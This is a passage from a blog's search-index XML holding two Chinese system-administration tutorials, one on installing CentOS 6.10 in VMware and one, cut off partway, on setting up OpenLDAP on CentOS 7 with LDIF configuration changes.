<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CentOS6.10安装详解</title>
    <url>/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CentOS6-10安装详解"><a href="#CentOS6-10安装详解" class="headerlink" title="CentOS6.10安装详解"></a>CentOS6.10安装详解</h1><h3 id="1-1-准备工作"><a href="#1-1-准备工作" class="headerlink" title="1.1 准备工作"></a>1.1 准备工作</h3><p>虚拟机：VMware Workstation 12 Pro<br>CentOS版本：CentOS-6.10-x86_64-bin-DVD1.iso</p>
<p>获取CentOS路径<br><a href="https://wiki.centos.org/Download" target="_blank" rel="noopener">https://wiki.centos.org/Download</a><br><a href="http://mirrors.aliyun.com/" target="_blank" rel="noopener">http://mirrors.aliyun.com</a><br><a href="http://mirrors.sohu.com/" target="_blank" rel="noopener">http://mirrors.sohu.com</a><br><a href="http://mirrors.163.com/" target="_blank" rel="noopener">http://mirrors.163.com</a></p>
<h3 id="1-2-创建虚拟机"><a href="#1-2-创建虚拟机" class="headerlink" title="1.2 创建虚拟机"></a>1.2 创建虚拟机</h3><h4 id="1-2-1-新建虚拟机"><a href="#1-2-1-新建虚拟机" class="headerlink" title="1.2.1 新建虚拟机"></a>1.2.1 新建虚拟机</h4><p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174135631.png" alt="image-20200916174135631"></p>
<h4 id="1-2-2-选择类型"><a href="#1-2-2-选择类型" class="headerlink" title="1.2.2 选择类型"></a>1.2.2 选择类型</h4><p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174146392.png" alt="image-20200916174146392"></p>
<h4 id="1-2-3-选择稍后安装操作系统"><a href="#1-2-3-选择稍后安装操作系统" class="headerlink" title="1.2.3 选择稍后安装操作系统"></a>1.2.3 选择稍后安装操作系统</h4><p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174203032.png" alt="image-20200916174203032"></p>
<h4 id="1-2-4-选择Centos-64位"><a href="#1-2-4-选择Centos-64位" class="headerlink" title="1.2.4 选择Centos 64位"></a>1.2.4 选择Centos 64位</h4><p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174215703.png" alt="image-20200916174215703"></p>
<h4 id="1-2-5-输入虚拟机名称和安装位置"><a href="#1-2-5-输入虚拟机名称和安装位置" class="headerlink" title="1.2.5 输入虚拟机名称和安装位置"></a>1.2.5 输入虚拟机名称和安装位置</h4><p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174228269.png" alt="image-20200916174228269"></p>
<h4 id="1-2-6-选择磁盘大小，这里我选择200G，也可保持默认；建议将虚拟磁盘存储为单个文件；"><a href="#1-2-6-选择磁盘大小，这里我选择200G，也可保持默认；建议将虚拟磁盘存储为单个文件；" class="headerlink" title="1.2.6 选择磁盘大小，这里我选择200G，也可保持默认；建议将虚拟磁盘存储为单个文件；"></a>1.2.6 选择磁盘大小，这里我选择200G，也可保持默认；建议将虚拟磁盘存储为单个文件；</h4><p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174243554.png" alt="image-20200916174243554"></p>
<h4 id="1-2-7-自定义硬件"><a href="#1-2-7-自定义硬件" class="headerlink" title="1.2.7 自定义硬件"></a>1.2.7 自定义硬件</h4><p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174257823.png" alt="image-20200916174257823"></p>
<p>cpu数量根据自己电脑配置设置，我这里将cpu数量设置为2，如下图所示：</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174311271.png" alt="image-20200916174311271"></p>
<p>内存至少给足1G，保证可以正常安装</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174323439.png" alt="image-20200916174323439"></p>
<p>点击移除打印机</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174335210.png" alt="image-20200916174335210"></p>
<p>插入iso镜像——单击CD/DVD,选择使用ISO镜像文件，点击浏览，找到iso镜像，点击确定</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174348521.png" alt="image-20200916174348521"></p>
<p>点击右下角的关闭，再点击完成，虚拟机创建成功</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174405373.png" alt="image-20200916174405373"></p>
<h3 id="1-3-安装"><a href="#1-3-安装" class="headerlink" title="1.3 安装"></a>1.3 安装</h3><p>开机，选择“Install or upgrade an existing system”（安装或升级现存的系统）</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174430215.png" alt="image-20200916174430215"></p>
<p>是否检测光盘完整性，选择“skip”</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174444003.png" alt="image-20200916174444003"></p>
<p>语言，保持默认即可</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174455103.png" alt="image-20200916174455103"></p>
<p>键盘布局，同样保持默认</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174533902.png" alt="image-20200916174533902"></p>
<p>安装位置，选择基本存储设备</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174548329.png" alt="image-20200916174548329"></p>
<p>选择清除磁盘上的所有数据</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174600775.png" alt="image-20200916174600775"></p>
<p>自定义主机名</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174613265.png" alt="image-20200916174613265"></p>
<p>点击左下角，配置网络</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174625504.png" alt="image-20200916174625504"></p>
<p>勾选“connect automatically”，即打开自动连接（默认网卡不启用）， 然后点击Apply，点击close</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174638826.png" alt="image-20200916174638826"></p>
<p>点击“next”下一步</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174710448.png" alt="image-20200916174710448"></p>
<p>配置时区，在地图上找到上海，并取消勾选“System clock uses UTC”</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174721680.png" alt="image-20200916174721680"></p>
<p>设置root密码</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174736493.png" alt="image-20200916174736493"></p>
<p>选择“Use Anyway”，即无论如何都使用</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174749270.png" alt="image-20200916174749270"></p>
<p>安装方式，选择“Create Custom Layout”自定义布局</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174801204.png" alt="image-20200916174801204"></p>
<p>点击“Free”，再点击“Create”创建分区</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174811745.png" alt="image-20200916174811745"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">分区建议如下：</span><br><span class="line"></span><br><span class="line">总空间：200G</span><br><span class="line">&#x2F;dev&#x2F;sda1——mount &#x2F;boot—— 1G</span><br><span class="line">&#x2F;dev&#x2F;sda2——mount &#x2F;————50G</span><br><span class="line">&#x2F;dev&#x2F;sda3——mount &#x2F;app(实验安装软件使用）————20G</span><br><span class="line">&#x2F;dev&#x2F;sda4——划分为swap交换分区————2G</span><br></pre></td></tr></table></figure>

<p>选择“Standard Partition”，创建标准分区</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174841319.png" alt="image-20200916174841319"></p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174849281.png" alt="image-20200916174849281"></p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174856377.png" alt="image-20200916174856377"></p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174903809.png" alt="image-20200916174903809"></p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174910882.png" alt="image-20200916174910882"></p>
<p>效果如图所示</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174921264.png" alt="image-20200916174921264"></p>
<p>点击“Format”格式化</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174932352.png" alt="image-20200916174932352"></p>
<p>点击“Write change to disk”，开始分区</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174943855.png" alt="image-20200916174943855"></p>
<p>保持默认，点击“next”</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916174957330.png" alt="image-20200916174957330"></p>
<p>选择服务器角色，选择“Desktop”，然后点击“Customize now”定制</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916175009521.png" alt="image-20200916175009521"></p>
<p>根据需要安装软件包，然后点击“next”</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916175020666.png" alt="image-20200916175020666"></p>
<p>然后进入安装界面，开始安装</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916175032313.png" alt="image-20200916175032313"></p>
<p>安装完成后，点击“reboot”</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916175042627.png" alt="image-20200916175042627"></p>
<p>点击“Forward”，开始设置</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916175052818.png" alt="image-20200916175052818"></p>
<p>选择同意许可</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916175102705.png" alt="image-20200916175102705"></p>
<p>选择是否创建普通用户<br>设置时间，保持默认即可</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916175113375.png" alt="image-20200916175113375"></p>
<p>是否开启kdump,把√取消掉，选择“No”，点击“finish”完成设置</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/10/CentOS6.10%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/image-20200916175130160.png" alt="image-20200916175130160"></p>
<p>安装完成了</p>
<p>建议：关机创建一个初始快照，便于后期恢复。</p>
]]></content>
      <categories>
        <category>centos</category>
      </categories>
      <tags>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7下OpenLDAP+PhpLdapAdmin基本安装</title>
    <url>/2019/07/12/CentOS7%E4%B8%8BOpenLDAP+PhpLdapAdmin%E5%9F%BA%E6%9C%AC%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Centos7下OpenLDAP-PhpLdapAdmin基本安装"><a href="#Centos7下OpenLDAP-PhpLdapAdmin基本安装" class="headerlink" title="Centos7下OpenLDAP+PhpLdapAdmin基本安装"></a>Centos7下OpenLDAP+PhpLdapAdmin基本安装</h2><p><strong>LDAP是轻量目录访问协议</strong>，英文全称是<strong>Lightweight Directory Access Protocol</strong>，一般都简称为LDAP。按照我们对文件目录的理解，ldap可以看成一个文件系统，类似目录和文件树。</p>
<p><strong>LDAP的特点：</strong></p>
<p>1.LDAP目录服务可以有效地解决众多网络服务的用户账户问题。</p>
<p>2.LDAP目录服务规定了统一的身份信息数据库、身份认证机制和接口，实现了资源和信息的统一管理，保证了数据的一致性和完整性。</p>
<p>3.LDAP目录服务是以树状的层次结构来描述数据信息的，此种模型适应了众多行业应用的业务组织结构。</p>
<p>OpenLDAP用来管理产线服务器账号与密码，主机登录权限以及sudo权限</p>
<p><strong>OpenLDAP</strong> 是最常用的目录服务之一，它是一个由开源社区及志愿者开发和管理的一个开源项目，<strong>提供了目录服务的所有功能，包括目录搜索、身份认证、安全通道、过滤器</strong>等等。</p>
<p><strong>penLDAP 目录服务优点</strong></p>
<p>  OpenLDAP 目录服务有以下10 个优点。</p>
<ul>
<li>OpenLDAP 是一个跨平台的标准互联网协议，它基于X.500 标准协议。</li>
<li>OpenLDAP 提供静态数据查询搜索，不需要像在关系数据中那样通过SQL 语句维护数据库信息。</li>
<li>OpenLDAP 基于推和拉的机制实现节点间数据同步，简称复制（replication）并提供基于TLS、SASL 的安全认证机制，实现数据加密传输以及Kerberos 密码验证功能。</li>
<li>OpenLDAP 可以基于第三方开源软件实现负载（LVS、HAProxy）及高可用性解决方案，24 小时提供验证服务，如Headbeat、Corosync、Keepalived 等。</li>
<li>OpenLDAP 数据元素使用简单的文本字符串（简称LDIF 文件）而非一些特殊字符，便于维护管理目录树条目。 章</li>
<li>OpenLDAP 可以实现用户的集中认证管理，所有关于账号的变更，只须在OpenLDAP 服务器端直接操作，无须到每台客户端进行操作，影响范围为全局。</li>
<li>OpenLDAP 默认使用协议简单如支持TCP/ZP 协议传输条目数据，通过使用查找操作实现对目录树条目信息的读写操作，同样可以通过加密的方式进行获取目录树条目信息。</li>
<li>OpenLDAP 产品应用于各大应用平台（Nginx、HTTP、vsftpd、Samba、SVN、Postfix、OpenStack、<a href="http://www.linuxidc.com/topicnews.aspx?tid=13" target="_blank" rel="noopener">Hadoop</a> 等）、服务器（HP、IBM、Dell 等）以及存储（EMC、NetApp 等）控制台，负责管理账号验证功能，实现账号统一管理。</li>
<li>OpenLDAP 实现具有费用低、配置简单、功能强大、管理容易及开源的特点。</li>
<li>OpenLDAP 通过ACL（Access Control List）灵活控制用户访问数据的权限，从而保证数据的安全性。</li>
</ul>
<p><strong>OpenLDAP 功能</strong></p>
<p>  在LDAP 的功能模型中定义了一系列利用LDAP 协议的操作，主要包含以下4 部分。</p>
<ul>
<li>查询操作（ldapsearch）：允许查询目录并取得条目，其查询性能比关系数据库好。</li>
<li>更新操作（ldapupdate）：目录树条目支持条目的添加、删除、修改等操作。</li>
<li>同步操作：OpenLDAP 是一种典型的分布式结构，提供复制同步，可将主服务器上的数据通过推或拉的机制实现在从服务器上更新，完成数据的同步，从而避免OpenLDAP 服务器出现单点故障，影响用户验证。</li>
<li>认证和管理操作：允许客户端在目录中识别自己，并且能够控制一个会话的性质。</li>
</ul>
<h3 id="1-安装openldap"><a href="#1-安装openldap" class="headerlink" title="1.安装openldap"></a>1.安装openldap</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">yum安装软件</span></span><br><span class="line">[root@openldap-server ~]# yum install -y openldap openldap-clients openldap-servers</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 复制一个默认配置到指定目录下,并授权，这一步一定要做，然后再启动服务，不然生产密码时会报错</span></span><br><span class="line">[root@openldap-server ~]# cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 授权给ldap用户,此用户yum安装时便会自动创建</span></span><br><span class="line">[root@openldap-server ~]# chown -R ldap. /var/lib/ldap/DB_CONFIG</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动服务，先启动服务，配置后面再进行修改</span></span><br><span class="line">[root@openldap-server ~]# systemctl start slapd</span><br><span class="line">[root@openldap-server ~]# systemctl enable slapd</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看状态，正常启动则ok</span></span><br><span class="line">[root@openldap-server ~]# systemctl status slapd</span><br></pre></td></tr></table></figure>

<h3 id="2-修改openldap配置"><a href="#2-修改openldap配置" class="headerlink" title="2.修改openldap配置"></a>2.修改openldap配置</h3><p>​       从openldap2.4.23版本开始，所有配置都保存在<code>/etc/openldap/slapd.d</code>目录下的<code>cn=config</code>文件夹内，不再使用<code>slapd.conf</code>作为配置文件。配置文件的后缀为ldif，且每个配置文件都是通过命令自动生成的，任意打开一个配置文件，在开头都会有一行注释，说明此为自动生成的文件，请勿编辑，使用ldapmodify命令进行修改。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> AUTO-GENERATED FILE - DO NOT EDIT!! Use ldapmodify.</span></span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2019/07/12/CentOS7%E4%B8%8BOpenLDAP+PhpLdapAdmin%E5%9F%BA%E6%9C%AC%E5%AE%89%E8%A3%85/image-20200821150748187.png" alt="image-20200821150748187"></p>
<p>安装openldap后，会有三个命令用于修改配置文件，分别为ldapadd, ldapmodify, ldapdelete，顾名思义就是添加，修改和删除。而需要修改或增加配置时，则需要先写一个ldif后缀的配置文件，然后通过命令将写的配置更新到slapd.d目录下的配置文件中去，完整的配置过程如下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 生成管理员密码,记录下这个密码，后面需要用到</span></span><br><span class="line">[root@openldap-server ldap]# slappasswd -s 123456</span><br><span class="line">&#123;SSHA&#125;qn19U7NtQsgOa6YdF1CjRWFX7Fplq6sN</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 新增修改密码文件.ldif为后缀，文件名随意，不要在/etc/openldap/slapd.d/目录下创建文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 生成的文件为需要通过命令去动态修改ldap现有配置，如下，我在家目录下，创建文件</span></span><br><span class="line">[root@openldap-server ldap]# cd</span><br><span class="line">[root@openldap-server ~]# vim myldap.ldif </span><br><span class="line">dn: olcDatabase=&#123;0&#125;config,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">add: olcRootPW</span><br><span class="line">olcRootPW: &#123;SSHA&#125;qn19U7NtQsgOa6YdF1CjRWFX7Fplq6sN</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里解释一下这个文件的内容：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 第一行执行配置文件，这里就表示指定为 olcDatabase\=\&#123;0\&#125;config.ldif 文件。在/etc/openldap/slapd.d/目录下就能找到此文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 第二行 changetype 指定类型为修改</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 第三行 add 表示添加 olcRootPW 配置项</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 第四行指定 olcRootPW 配置项的值</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 执行命令，修改ldap配置，通过-f执行文件</span></span><br><span class="line">[root@openldap-server ~]# ldapadd -Y EXTERNAL -H ldapi:/// -f myldap.ldif </span><br><span class="line">SASL/EXTERNAL authentication started</span><br><span class="line">SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth</span><br><span class="line">SASL SSF: 0</span><br><span class="line">modifying entry "olcDatabase=&#123;0&#125;config,cn=config"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">去查看olcDatabase\=\&#123;0\&#125;config.ldif文件，里面是没有olcRootPW这个项的，执行命令后，会新增了olcRootPW项，而且内容是我们文件中指定的值加密后的字符串</span></span><br><span class="line"><span class="meta">#</span><span class="bash">以上就是修改配置的操作了，一定不要去直接修改/etc/openldap/slapd.d目录下的文件。</span></span><br></pre></td></tr></table></figure>

<p>接下来继续配置。执行下面的命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ls /etc/openldap/schema/*.ldif | xargs -I &#123;&#125; sudo ldapadd -Y EXTERNAL -H ldapi:/// -f &#123;&#125;</span><br></pre></td></tr></table></figure>


<p>修改域名，新增changedomain.ldif, 这里我自定义的域名为 <code>lianglong.com</code>管理员用户账号为<code>admin</code>。</p>
<p>如果要修改，则修改文件中相应的<code>dc=lianglong,dc=com</code>为自己的域名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cat &gt; changedomin.ldif &lt;&lt;-EOF</span><br><span class="line">dn: olcDatabase=&#123;1&#125;monitor,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">replace: olcAccess</span><br><span class="line">olcAccess: &#123;0&#125;to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth" read by dn.base="cn=admin,dc=lianglong,dc=com" read by * none</span><br><span class="line"></span><br><span class="line">dn: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">replace: olcSuffix</span><br><span class="line">olcSuffix: dc=lianglong,dc=com</span><br><span class="line"></span><br><span class="line">dn: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">replace: olcRootDN</span><br><span class="line">olcRootDN: cn=admin,dc=lianglong,dc=com</span><br><span class="line"></span><br><span class="line">dn: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">replace: olcRootPW</span><br><span class="line">olcRootPW: &#123;SSHA&#125;qn19U7NtQsgOa6YdF1CjRWFX7Fplq6sN</span><br><span class="line"></span><br><span class="line">dn: olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">add: olcAccess</span><br><span class="line">olcAccess: &#123;0&#125;to attrs=userPassword,shadowLastChange by dn="cn=admin,dc=lianglong,dc=com" write by anonymous auth by self write by * none</span><br><span class="line">olcAccess: &#123;1&#125;to dn.base="" by * read</span><br><span class="line">olcAccess: &#123;2&#125;to * by dn="cn=admin,dc=lianglong,dc=com" write by * read</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@openldap-server ~]# ldapmodify -Y EXTERNAL -H ldapi:/// -f changedomin.ldif </span><br><span class="line">SASL/EXTERNAL authentication started</span><br><span class="line">SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth</span><br><span class="line">SASL SSF: 0</span><br><span class="line">ldapmodify: wrong attributeType at line 5, entry "olcDatabase=&#123;1&#125;monitor,cn=config"</span><br><span class="line"><span class="meta">#</span><span class="bash">执行本次命令报错，报错原因是文件中有空格存在，用:<span class="built_in">set</span> list查看空格并删除。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">正确的输出</span></span><br><span class="line">[root@localhost ~]# ldapmodify -Y EXTERNAL -H ldapi:/// -f changedomin.ldif </span><br><span class="line">SASL/EXTERNAL authentication started</span><br><span class="line">SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth</span><br><span class="line">SASL SSF: 0</span><br><span class="line">modifying entry "olcDatabase=&#123;1&#125;monitor,cn=config"</span><br><span class="line"></span><br><span class="line">modifying entry "olcDatabase=&#123;2&#125;hdb,cn=config"</span><br><span class="line"></span><br><span class="line">modifying entry "olcDatabase=&#123;2&#125;hdb,cn=config"</span><br><span class="line"></span><br><span class="line">modifying entry "olcDatabase=&#123;2&#125;hdb,cn=config"</span><br><span class="line"></span><br><span class="line">modifying entry "olcDatabase=&#123;2&#125;hdb,cn=config"</span><br></pre></td></tr></table></figure>

<p>然后开启memberof功能，新建下面三个文件，内容如下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@openldap-server ~]# cat &gt; mymemberod.ldif &lt;&lt;-EOF</span><br><span class="line">dn: cn=module&#123;0&#125;,cn=config</span><br><span class="line">cn: modulle&#123;0&#125;</span><br><span class="line">objectClass: olcModuleList</span><br><span class="line">objectclass: top</span><br><span class="line">olcModuleload: memberof.la</span><br><span class="line">olcModulePath: /usr/lib64/openldap</span><br><span class="line"></span><br><span class="line">dn: olcOverlay=&#123;0&#125;memberof,olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">objectClass: olcConfig</span><br><span class="line">objectClass: olcMemberOf</span><br><span class="line">objectClass: olcOverlayConfig</span><br><span class="line">objectClass: top</span><br><span class="line">olcOverlay: memberof</span><br><span class="line">olcMemberOfDangling: ignore</span><br><span class="line">olcMemberOfRefInt: TRUE</span><br><span class="line">olcMemberOfGroupOC: groupOfUniqueNames</span><br><span class="line">olcMemberOfMemberAD: uniqueMember</span><br><span class="line">olcMemberOfMemberOfAD: memberOf</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">[root@openldap-server ~]# cat &gt; myrefint1.ldif &lt;&lt;-EOF </span><br><span class="line">dn: cn=module&#123;0&#125;,cn=config</span><br><span class="line">add: olcmoduleload</span><br><span class="line">olcmoduleload: refint</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">[root@openldap-server ~]# cat &gt; myrefint2.ldif &lt;&lt;-EOF</span><br><span class="line">dn: olcOverlay=refint,olcDatabase=&#123;2&#125;hdb,cn=config</span><br><span class="line">objectClass: olcConfig</span><br><span class="line">objectClass: olcOverlayConfig</span><br><span class="line">objectClass: olcRefintConfig</span><br><span class="line">objectClass: top</span><br><span class="line">olcOverlay: refint</span><br><span class="line">olcRefintAttribute: memberof uniqueMember  manager owner</span><br><span class="line">EOF</span><br><span class="line"><span class="meta">#</span><span class="bash">新建完文件后依次执行下方命令。</span></span><br><span class="line">[root@openldap-server ~]# ldapadd -Q -Y EXTERNAL -H ldapi:/// -f mymemberod.ldif </span><br><span class="line">adding new entry "cn=module&#123;0&#125;,cn=config"</span><br><span class="line"></span><br><span class="line">adding new entry "olcOverlay=&#123;0&#125;memberof,olcDatabase=&#123;2&#125;hdb,cn=config"</span><br><span class="line"></span><br><span class="line">[root@openldap-server ~]# ldapmodify -Q -Y EXTERNAL -H ldapi:/// -f myrefint1.ldif </span><br><span class="line">modifying entry "cn=module&#123;0&#125;,cn=config"</span><br><span class="line"></span><br><span class="line">[root@openldap-server ~]# ldapadd -Q -Y EXTERNAL -H ldapi:/// -f myrefint2.ldif</span><br><span class="line">adding new entry "olcOverlay=refint,olcDatabase=&#123;2&#125;hdb,cn=config"</span><br></pre></td></tr></table></figure>

<p>到此，配置修改完了，在上述基础上，我们来创建一个叫做 <code>lianglong Company</code>的组织，并在其下创建一个 <code>admin</code>的组织角色（该组织角色内的用户具有管理整个 LDAP 的权限）和 People 和 Group 两个组织单元</p>
